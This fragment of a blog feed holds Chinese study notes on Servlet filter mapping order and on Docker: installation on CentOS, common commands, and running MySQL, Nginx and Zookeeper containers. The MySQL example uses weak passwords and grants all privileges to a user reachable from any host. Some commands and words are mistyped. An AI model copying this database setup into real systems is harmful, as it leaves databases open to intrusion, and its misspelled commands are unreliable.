class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置为只有访问该网站的/Helloword地址时才通过该过滤器</span></span><br><span class="line"><span class="comment">    &lt;url-pattern&gt;/Helloword&lt;/url-pattern&gt;  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="3-Servlet过滤器的应用顺序"><a href="#3-Servlet过滤器的应用顺序" class="headerlink" title="3.Servlet过滤器的应用顺序"></a>3.Servlet过滤器的应用顺序</h2><p>假设定义了两个过滤器 AuthenFilter 和 LogFilter。需要创建一个如下所述的不同的映射，其余的处理与上述所讲解的大致相同：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>LogFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.runoob.test.LogFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>test-param<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Initialization Paramter<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthenFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.runoob.test.AuthenFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>test-param<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Initialization Paramter<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>LogFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthenFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web.xml文件中的filter-mapping元素的顺序决定了Web容器应用过滤器到Servlet的顺序。</p>
<h1 id="Servlet-Cookie处理"><a href="#Servlet-Cookie处理" class="headerlink" title="Servlet Cookie处理"></a>Servlet Cookie处理</h1><h1 id="Servlet-Session跟踪"><a href="#Servlet-Session跟踪" class="headerlink" title="Servlet Session跟踪"></a>Servlet Session跟踪</h1>]]></content>
      <categories>
        <category>JavaWeb学习</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>docker学习</title>
    <url>/post/7fb3659b.html</url>
    <content><![CDATA[<p>　　在学习十次方项目的时候，这个知识点并不了解，找个视频学习总结一下，不得不说，确实比虚拟机好用<span id="more"></span></p>
<h1 id="第一章-Dokcer概述"><a href="#第一章-Dokcer概述" class="headerlink" title="第一章 Dokcer概述"></a>第一章 Dokcer概述</h1><h2 id="1-1-虚拟化技术发展史"><a href="#1-1-虚拟化技术发展史" class="headerlink" title="1.1 虚拟化技术发展史"></a>1.1 虚拟化技术发展史</h2><p>　　在虚拟化技术出现之前，我们要想搭建一台服务器，需要如下工作：</p>
<p>-&gt;购买硬件服务器</p>
<p>-&gt;在硬件服务器安装配置操作系统</p>
<p>-&gt;再操作系统之上配置应用环境</p>
<p>-&gt;部署并运行应用</p>
<p>这种方式的缺点就送货车</p>
<p>-&gt;部署应用非常慢</p>
<p>-&gt;需要花费的成本非常高</p>
<p>-&gt;应用迁移麻烦</p>
<h2 id="1-2-虚拟化技术是什么"><a href="#1-2-虚拟化技术是什么" class="headerlink" title="1.2 虚拟化技术是什么"></a>1.2 虚拟化技术是什么</h2><p>　　虚拟化是一种计算机资源管理技术，是佳能计算机的各种硬件资源，比如服务器、网络、CPU、内存等，予以抽象和转化后呈现出一套新的硬件资源环境，在这一套环境下我们可以安装我们的操作系统，部署我们的应用运行环境。他打破计算机硬件资源补课切割的障碍。</p>
<h2 id="1-3-虚拟化技术的分类"><a href="#1-3-虚拟化技术的分类" class="headerlink" title="1.3 虚拟化技术的分类"></a>1.3 虚拟化技术的分类</h2><p><strong>硬件级虚拟化</strong></p>
<p>　　是运行在硬件之上的虚拟化技术，他的核心技术是Hypervisor，Hypervisor是一种运行在基础物理服务器之上的软件层，可以虚拟化硬件资源，例如CPU、硬盘、内存等、然后我们可以通过在虚拟化出来的资源之上安装操作系统，也就是所谓的虚拟机，如VMWare。通过Hypervisor层我们可以创建不同的虚拟机，并且每个虚拟机都是独立分离的。</p>
<p><strong>操作系统级虚拟化</strong></p>
<p>　　是运行在操作系统之上的虚拟化技术，它模拟的是运行在一个操作系统上的多个不同进程，并将其封装在一个密闭的容器里面，该技术也叫容器化技术。Docker是目前最流行的一种实现。</p>
<h2 id="1-4-虚拟化技术的优缺点"><a href="#1-4-虚拟化技术的优缺点" class="headerlink" title="1.4 虚拟化技术的优缺点"></a>1.4 虚拟化技术的优缺点</h2><p>　　优点：一台物理服务器可以虚拟化出多个虚拟的服务器，让计算机资源可以充分利用。</p>
<p>　　缺点：1.每创建一个虚拟机，会占用很多资源，资源消耗太多，2.环境兼容性问题</p>
<h2 id="1-5-容器技术的发展"><a href="#1-5-容器技术的发展" class="headerlink" title="1.5 容器技术的发展"></a>1.5 容器技术的发展</h2><p>　　基于硬件级虚拟化技术的不足，后续又发展出来另一种虚拟化技术，及操作系统级虚拟化技术。Docker基于LXC技术，是Linux平台上的容器化技术实现。</p>
<p>注：LXC是Linux Container的间写，它是一种内核虚拟化技术，可以提供轻量级的虚拟化，以便隔离进程和资源，它与宿主机使用同一个内核，性能损耗小，这种技术是Linux提供的，但是知道Docker出世，该技术才被发挥出来。</p>
<h2 id="1-6-Docker的发展历史"><a href="#1-6-Docker的发展历史" class="headerlink" title="1.6 Docker的发展历史"></a>1.6 Docker的发展历史</h2><p>　　2010年，有几个年轻人在旧金山成立了一家做PaaS平台的创业公司，起名叫dotCloud，并且还获得了创业孵化器Y ComBinator的支持，虽然sotCloud期间还获得过一些融资，但是随着IT剧透也杀入PaaS平台，dotCloud举步维艰。</p>
<p>　　2013年，dotCloud的创始人，28岁的Solomon Hykes做了一个艰难的决定：将dotCloud的核心引擎开源，这项核心引擎技术能够将Linux容器中的应用代码打包，轻松地在服务器之间迁移。然而，这个基于LXC技术的核心管理引擎开源后，让全世界的技术人员感到惊艳，让所有的It巨头们也为之一颤。</p>
<p>　　2013年docker开源开始，Docker技术风靡全球，于是将cotCloud公司决定将Docker作为主要业务进行发展，并把公司改名Docker Inc，全身心投入到Docker开发。</p>
<h2 id="1-7-Docker是什么"><a href="#1-7-Docker是什么" class="headerlink" title="1.7 Docker是什么"></a>1.7 Docker是什么</h2><p>　　1.Docker 是一个开源的应用容器引擎，它是基于Google公司推出的Go语言实现。</p>
<p>　　2.Docker技术让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，打包好的容器可以发布到任何流行的Linux服务器上运行，这样就解决了开发环境和运维环境不一致的问题，所以容器技术解决了开发和运维之间的矛盾，让开发专注与开发，运维专注与运维。</p>
<p>　　3.Docker彻底释放了虚拟化的为例，极大的剑光低了计算机资源供应的成本，Docker重新定义了程序开发测试、交付和部署过程、Docker提出了“构建一次，到处运行的理念“。</p>
<p>　　４.Docker是一种轻量级的操作系统虚拟化解决方案，Docker的基础是Linux容器技术，在LXC的基础上Docker进行了近一步封装，让用户不需要关心容器的管理，使得操作更为简便，用户操作Docker容器就像操作一个快速轻量级的虚拟机一样简单。</p>
<p>　　<strong>总结</strong>：Docker是对软件和其依赖环境的标准化打包，应用之间相互个例，共享一个OS Kernerl（解决了资源浪费问题），可以运行在很多主流的操作系统上；注意：Docker本身不是容器，Docker只是管理容器的引擎。</p>
<h2 id="1-8-容器和虚拟机的区别"><a href="#1-8-容器和虚拟机的区别" class="headerlink" title="1.8 容器和虚拟机的区别"></a>1.8 容器和虚拟机的区别</h2><p>　　容器是将代码和环境关系打包在一起的集合，而虚拟机是在物理层面上，分出来一个操作系统；多个容器可以运行在同一台物理服务器上，并共享一个操作系统的内核资源。多个虚拟机也可以运行在同一台机器上，但是每个虚拟机都需要一个完整的操作系统。</p>
<p><img src="https://z3.ax1x.com/2021/03/24/6HhSTH.jpg" alt="6HhSTH.jpg"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody>
<tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘空间</td>
<td>一般为几十MB</td>
<td>一般为10GB</td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于原生</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
<tr>
<td>操作系统</td>
<td>与宿主机共享OS</td>
<td>宿主机OS上运行虚拟</td>
</tr>
</tbody>
</table>
</div>
<h1 id="第二章-Docker环境搭建"><a href="#第二章-Docker环境搭建" class="headerlink" title="第二章 Docker环境搭建"></a>第二章 Docker环境搭建</h1><h2 id="2-1-安装Docker"><a href="#2-1-安装Docker" class="headerlink" title="2.1 安装Docker"></a>2.1 安装Docker</h2><blockquote>
<p>环境准备</p>
</blockquote>
<p>1.需要一些linux基础</p>
<p>2.CentOS7</p>
<p>3.使用Xshell链接远程服务器</p>
<blockquote>
<p>系统环境</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]# uname -r</span><br><span class="line">3.10.0-957.el7.x86_64</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;7 (Core)&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;7&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;</span><br><span class="line">HOME_URL=&quot;https://www.centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>安装</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">判断是否安装了docker</span></span><br><span class="line">yum list installed | grep docker</span><br><span class="line"><span class="meta">#</span><span class="bash"> 1.卸载旧的版本</span></span><br><span class="line">yum remove docker \</span><br><span class="line">docker-client \</span><br><span class="line">docker-client-latest \</span><br><span class="line">docker-common \</span><br><span class="line">docker-latest \</span><br><span class="line">docker-latest-logrotate \</span><br><span class="line">docker-logrotate \</span><br><span class="line">docker-engine</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.需要安装包</span></span><br><span class="line">yum install docker -y</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.查看Docker版本</span></span><br><span class="line">docker --version</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.设置镜像仓库</span></span><br><span class="line">yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">https://download.docker.com/linux/centos/docker-ce.repo #默认是国外</span><br><span class="line"></span><br><span class="line">yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo #推荐使用阿里云</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新yum软件包索引</span></span><br><span class="line">yum makecache fast</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4.安装docker相关的		docker-ce 社区	ee 企业版</span></span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5.启动docker</span></span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6.使用docker version判断是否安装成功</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 7.hello-world</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<blockquote>
<p>卸载docker</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1.卸载依赖</span></span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.删除资源</span></span><br><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>
<h3 id="2-1-1-阿里云镜像加速"><a href="#2-1-1-阿里云镜像加速" class="headerlink" title="2.1.1 阿里云镜像加速"></a>2.1.1 阿里云镜像加速</h3><p>登录阿里云的容器镜像服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://lmdwf9h2.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h3 id="2-1-2-底层原理"><a href="#2-1-2-底层原理" class="headerlink" title="2.1.2 底层原理"></a>2.1.2 底层原理</h3><p><strong>Docker是怎么工作的</strong></p>
<p>　　Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问！新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核。</p>
<h2 id="2-2-Docker的常用命令"><a href="#2-2-Docker的常用命令" class="headerlink" title="2.2 Docker的常用命令"></a>2.2 Docker的常用命令</h2><h3 id="2-2-1-帮助命令"><a href="#2-2-1-帮助命令" class="headerlink" title="2.2.1 帮助命令"></a>2.2.1 帮助命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker -v</span><br><span class="line">docker info</span><br><span class="line">docker --help  #帮助命令</span><br></pre></td></tr></table></figure>
<h3 id="2-2-2-服务启动"><a href="#2-2-2-服务启动" class="headerlink" title="2.2.2 服务启动"></a>2.2.2 服务启动</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker  #启动</span><br><span class="line">systemctl stop docker   #停止</span><br><span class="line">systemctl restart docker#重启</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查运行状态</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line">ps -ef | grep docker #查看docker进程</span><br></pre></td></tr></table></figure>
<p>启动已经创建的images</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker start ID</span><br></pre></td></tr></table></figure>
<p><strong>基本命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查看所有镜像 docker images</span><br><span class="line"></span><br><span class="line">删除镜像(会提示先停止使用中的容器) docker rmi 镜像name/镜像id</span><br><span class="line"></span><br><span class="line">查看所有容器 docker ps -a</span><br><span class="line"></span><br><span class="line">查看容器运行日志 docker logs 容器名称/容器id</span><br><span class="line"></span><br><span class="line">停止容器运行 docker stop 容器name/容器id</span><br><span class="line"></span><br><span class="line">终止容器后运行 docker start 容器name/容器id</span><br><span class="line"></span><br><span class="line">容器重启 docker restart 容器name/容器id</span><br><span class="line"></span><br><span class="line">删除容器 docker rm 容器name/容器id</span><br></pre></td></tr></table></figure>
<h2 id="2-3-Docker使用体验"><a href="#2-3-Docker使用体验" class="headerlink" title="2.3 Docker使用体验"></a>2.3 Docker使用体验</h2><h3 id="2-3-1-第一个Docker容器"><a href="#2-3-1-第一个Docker容器" class="headerlink" title="2.3.1 第一个Docker容器"></a>2.3.1 第一个Docker容器</h3><p>1.将Docker服务启动</p>
<p>2.下载一个镜像，Docker 运行一个容器前需要本地存在有对应的镜像，如果镜像不存在本地，Docker会从镜像仓库下载</p>
<p>CentOS如何下载镜像？</p>
<ul>
<li>从<a href="https://hub.docker.com/">docker hub</a>官网上搜索所需要的镜像，然后使用命令下载</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载镜像：</span></span><br><span class="line">docker pull tomcat</span><br><span class="line"><span class="meta">#</span><span class="bash">运行镜像：前台运行</span></span><br><span class="line">doker run tomcat</span><br><span class="line"><span class="meta">#</span><span class="bash">运行镜像：后台运行</span></span><br><span class="line">docker run -d tomcat</span><br><span class="line"><span class="meta">#</span><span class="bash">显示本地已有镜像：</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
<ul>
<li>可以使用<code>docker search ***</code>搜索</li>
</ul>
<h3 id="2-3-2-进入Docker容器"><a href="#2-3-2-进入Docker容器" class="headerlink" title="2.3.2 进入Docker容器"></a>2.3.2 进入Docker容器</h3><p>进入docker容器：<code>docker exec -it ID bash</code>其中-i表示交互式的，也就是保持标准输入流打开；t表示虚拟控制台，分配到一个控制台</p>
<p>进入容器：<code>docker exec -it ID bash</code></p>
<p>其中i表示交互式的，也就是保持标准输入流打开；</p>
<p>t表示虚拟控制台，分配到一个虚拟控制台；</p>
<p>退出容器：<code>exit</code></p>
<h3 id="2-3-3-客户机访问容器"><a href="#2-3-3-客户机访问容器" class="headerlink" title="2.3.3  客户机访问容器"></a>2.3.3  客户机访问容器</h3><p>从客户机上访问容器，需要有端口映射，docker容器默认采用桥接模式月宿主机通信，需要将宿主机的ip端口映射到容器的ip端口上；</p>
<p>停止容器：<code>docker stop ID</code></p>
<p>启动容器：<code>docker run -d -p 8080:8080 docker.io/tomcat</code></p>
<h1 id="第三章-Docker核心组件"><a href="#第三章-Docker核心组件" class="headerlink" title="第三章 Docker核心组件"></a>第三章 Docker核心组件</h1><h2 id="3-1-Doker的底层运行原理"><a href="#3-1-Doker的底层运行原理" class="headerlink" title="3.1 Doker的底层运行原理"></a>3.1 Doker的底层运行原理</h2><p>Docker使用客户端-服务器（C/S）架构模式，Docker服务启动-&gt;下载镜像-&gt;启动该镜像得到一个容器-&gt;容器里运行着我们想要的程序：</p>
<p><img src="https://z3.ax1x.com/2021/03/24/6Hfz0e.jpg" alt="6Hfz0e.jpg"></p>
<h2 id="3-2-Docker的核心要素"><a href="#3-2-Docker的核心要素" class="headerlink" title="3.2 Docker的核心要素"></a>3.2 Docker的核心要素</h2><p><strong>镜像（images）：</strong></p>
<p>　　docker镜像，就好比一个模版，可以通过这个模版来创建容器服务，最终服务运行或项目运行在容器中。</p>
<p><strong>容器（Container）：</strong></p>
<p>　　docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建</p>
<p>　　启动、停止、删除、基本命令，容器可以简单理解为一个简易的Linux系统</p>
<p><strong>仓库（Registry）：</strong></p>
<p>　　仓库就是存放镜像的地方，仓库分为公有仓库和私有仓库</p>
<h2 id="3-3-镜像"><a href="#3-3-镜像" class="headerlink" title="3.3 镜像"></a>3.3 镜像</h2><h3 id="3-3-1-镜像的基本概念"><a href="#3-3-1-镜像的基本概念" class="headerlink" title="3.3.1 镜像的基本概念"></a>3.3.1 镜像的基本概念</h3><p>Docker镜像就是一个只读的模板，可以用来创建Docker容器。</p>
<p>例如：一个镜像可以包含一个完整的centos操作系统环境，里面仅安装了mysql或者用户需要的其他应用程序。</p>
<p>Docker提供了一个非常简单的机制来创建镜像或者更新现有镜像，用户甚至可以直接从其他人那里下载一个已经做好的镜像来直接使用。</p>
<h3 id="3-3-2-镜像的组成结构"><a href="#3-3-2-镜像的组成结构" class="headerlink" title="3.3.2 镜像的组成结构"></a>3.3.2 镜像的组成结构</h3><p>镜像由许多层的文件系统叠加构成，最下面是一个引导文件系统bootfs，第二层是一个root文件系统rootfs，root文件系统通常是某种操作系统，比如centos，ubuntu，在root文件系统之上又有很多层文件系统，这些文件系统叠加在一起，构成docker中的镜像。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618907646-image-20210420163406173.png" alt="image-20210420163406173"></p>
<h3 id="3-3-3-镜像的日常操作"><a href="#3-3-3-镜像的日常操作" class="headerlink" title="3.3.3 镜像的日常操作"></a>3.3.3 镜像的日常操作</h3><p>1.下载镜像，比如下载redis镜像：<code>docker pull redis:latest</code></p>
<p>redis是查询到的镜像名称，latest是镜像的标签tag</p>
<p>安装一个镜像有两种方式，一种是从官方镜像仓库下载，一种是自己通过dockerfile文件构建。</p>
<p>2.列出已经下载的镜像：<code>docker images</code>或者<code>docker images redis</code></p>
<p>3.运行镜像：<code>docker run -d redis</code>其中-d表示在后台运行</p>
<p>然后通过 <code>ps -ef|grep redis</code>可以查到redis进程</p>
<p>4.查看容器状态：<code>docker ps</code></p>
<p>通过<code>docker exec -it ID bash</code>进入redis容器</p>
<p>5.删除镜像<code>docker rmi ID</code>，rm是删除容器，rmi是删除镜像。</p>
<h2 id="3-4-容器"><a href="#3-4-容器" class="headerlink" title="3.4 容器"></a>3.4 容器</h2><h3 id="3-4-1-容器的基本概念"><a href="#3-4-1-容器的基本概念" class="headerlink" title="3.4.1 容器的基本概念"></a>3.4.1 容器的基本概念</h3><p>容器是从镜像创建的运行实例。他可以被启动、停止、删除。每个容器都是相互隔离的、保证安全平台。可以把它看做一个简易版的Linux环境，包括root用户权限、进程空间、用户空间和网络空间和运行在其中的应用程序。</p>
<p>Docker利用容器来运行应用，镜像是只读的，容器再启动的时候创建一层可写层作为最上层。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618907646-image-20210420163406173.png" alt="image-20210420163406173"></p>
<h3 id="3-4-2-容器的日常操作"><a href="#3-4-2-容器的日常操作" class="headerlink" title="3.4.2 容器的日常操作"></a>3.4.2 容器的日常操作</h3><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态的容器重新启动。</p>
<p>通过镜像启动容器：<code>docker run -d redis</code></p>
<p>查看运行中的容器：<code>docker ps</code></p>
<p>查看所有的容器：<code>docker ps -a</code></p>
<p>进入容器：<code>docker exec -it ID bash</code></p>
<p>停止容器：<code>docker stop ID</code></p>
<p>启动容器：<code>docker start ID</code></p>
<p>获取容器更多信息：<code>docker inspect ID</code></p>
<p>停用全部运行中的容器：<code>docker stop $(docker ps -q)</code></p>
<p>删除全部容器：<code>docker rm $(docker ps -aq)</code></p>
<h2 id="3-5-仓库"><a href="#3-5-仓库" class="headerlink" title="3.5 仓库"></a>3.5 仓库</h2><h3 id="3-5-1-仓库的基本概念"><a href="#3-5-1-仓库的基本概念" class="headerlink" title="3.5.1 仓库的基本概念"></a>3.5.1 仓库的基本概念</h3><p>仓库是集中存放镜像文件的地方，有时候会把仓库和仓库注册服务器看做同一个事物，不作严格区分。实际上，仓库注册服务器上存放着许多仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签：</p>
<p>仓库分为公开仓库和私有仓库两种形式：</p>
<p>最大的公开仓库是<a href="https://hub.docker.com">DockerHub</a>，存放了数量庞大的镜像给用户下载；</p>
<p>当用户创建了自己的镜像后就可以使用push命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像的时候，只需要从仓库上pull下来就可以。</p>
<h3 id="3-5-2-仓库的日常操作"><a href="#3-5-2-仓库的日常操作" class="headerlink" title="3.5.2 仓库的日常操作"></a>3.5.2 仓库的日常操作</h3><p>用户通过<code>docker search</code>命令查找官方仓库中的镜像</p>
<h1 id="第四章-Docker使用示例"><a href="#第四章-Docker使用示例" class="headerlink" title="第四章 Docker使用示例"></a>第四章 Docker使用示例</h1><h2 id="4-1-Docker安装MySQL"><a href="#4-1-Docker安装MySQL" class="headerlink" title="4.1 Docker安装MySQL"></a>4.1 Docker安装MySQL</h2><h1 id="下载MySQL镜像："><a href="#下载MySQL镜像：" class="headerlink" title="下载MySQL镜像："></a>下载MySQL镜像：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql</span><br><span class="line">docker run -p 3306:3306 -e MYSQL_DATABASE=workdb -e MYSQL_ROOT_PASSWORD=root -d mysql</span><br></pre></td></tr></table></figure>
<p>其中-e是指定环境变量</p>
<h1 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it d19117e55e68 bash</span><br></pre></td></tr></table></figure>
<h1 id="登陆MySQL"><a href="#登陆MySQL" class="headerlink" title="登陆MySQL"></a>登陆MySQL</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
<h1 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="授权远程登录访问："><a href="#授权远程登录访问：" class="headerlink" title="授权远程登录访问："></a>授权远程登录访问：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">create user &#x27;wkcto&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;root&#x27;;</span><br><span class="line"></span><br><span class="line">grant all privileges on *.* to &#x27;wkcto&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>
<h2 id="4-2-Docker安装Nginx"><a href="#4-2-Docker安装Nginx" class="headerlink" title="4.2 Docker安装Nginx"></a>4.2 Docker安装Nginx</h2><h1 id="下载Nginx镜像："><a href="#下载Nginx镜像：" class="headerlink" title="下载Nginx镜像："></a>下载Nginx镜像：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line"></span><br><span class="line">docker run -p 80:80 -d nginx</span><br></pre></td></tr></table></figure>
<h1 id="进入容器："><a href="#进入容器：" class="headerlink" title="进入容器："></a>进入容器：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it 687e44a10f08 bash</span><br></pre></td></tr></table></figure>
<h1 id="浏览器访问Nginx："><a href="#浏览器访问Nginx：" class="headerlink" title="浏览器访问Nginx："></a>浏览器访问Nginx：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.200.133:80</span><br></pre></td></tr></table></figure>
<h1 id="Ngnix部署静态网站："><a href="#Ngnix部署静态网站：" class="headerlink" title="Ngnix部署静态网站："></a>Ngnix部署静态网站：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将虚拟机下的文件传到容器下</span></span><br><span class="line">docker cp /root/test.html 687e44a10f08:/usr/share/nginx/html</span><br></pre></td></tr></table></figure>
<h2 id="4-3-Docker安装Zookeeper"><a href="#4-3-Docker安装Zookeeper" class="headerlink" title="4.3 Docker安装Zookeeper"></a>4.3 Docker安装Zookeeper</h2><h1 id="下载Zookeeper镜像："><a href="#下载Zookeeper镜像：" class="headerlink" title="下载Zookeeper镜像："></a>下载Zookeeper镜像：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull zookeeper</span><br><span class="line"></span><br><span class="line">docker run  -p 2181:2181 -d zookeeper</span><br></pre></td></tr></table></figure>
<h1 id="进入容器：-1"><a href="#进入容器：-1" class="headerlink" title="进入容器："></a>进入容器：</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it 3e8bf7392b4e base</span><br></pre></td></tr></table></figure>
